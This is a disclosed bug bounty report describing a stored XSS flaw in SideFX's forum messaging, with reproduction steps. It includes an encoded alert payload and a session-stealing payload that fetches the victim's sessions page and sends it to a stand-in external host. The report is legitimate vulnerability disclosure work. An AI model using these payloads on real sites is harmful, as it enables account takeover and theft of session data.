# Stored XSS in messages

## Report Details
- **Report ID**: 1669764
- **URL**: https://hackerone.com/reports/1669764
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-08-15T15:41:56.569Z
- **Disclosed**: 2024-04-17T06:56:12.618Z

## Reporter
- **Username**: itriedallthenamess
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: sidefx

## Vulnerability Information
## Summary:
I have researched availabilities for XSS attacks and i found it in messages.
You should be authorized for this and approved by admin. 
To do this, you just need to make a post on the forum, which I did as the first step.

I was able to steal the session ID of the victim account (my second test account) and log in using it.
A session cannot be stolen via cookies, but the user has a page https://www.sidefx.com/account/sessions/. I sent a request to this page through the victim's account, and then inserted an image on the page with a link to my site. As a get parameter, I specified an html response encoded in base64``<img src=http://mysite.com?q={HTML}>``. It works even without a certificate

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Your account must be approved to be able to send messages
  1. Send message for some user (I sent messages to myself and my second test account). Message content ``https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxx&quotonerror=&quotalert&#40&#39XSS&#39&#41&quot&gt``
  1. Open a received or just sent message. You will see `alert` message

## Supporting Material/References:
My payload for getting session:
``https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxxx&quotonerror=&quotfetch&#40&#39https&#58&#47&#47www.sidefx.com/account/sessions&#39&#41.then&#40response=&gt&#123response.text&#40&#41.then&#40ddd=&gt&#123let&#32el=document.createElement&#40&#39img&#39&#41&#59el.src=&#39http&#58&#47&#47myfakesite.com?q=&#39&#43btoa&#40encodeURIComponent&#40ddd&#41&#41&#59document.body.appendChild&#40el&#41&#125&#41&#125&#41&quot&gt``

## Impact

This is a really critical vulnerability, because the site has a list of forum users (https://www.sidefx.com/forum/users/) and such a load can be sent to each user

## Attachments
No attachments
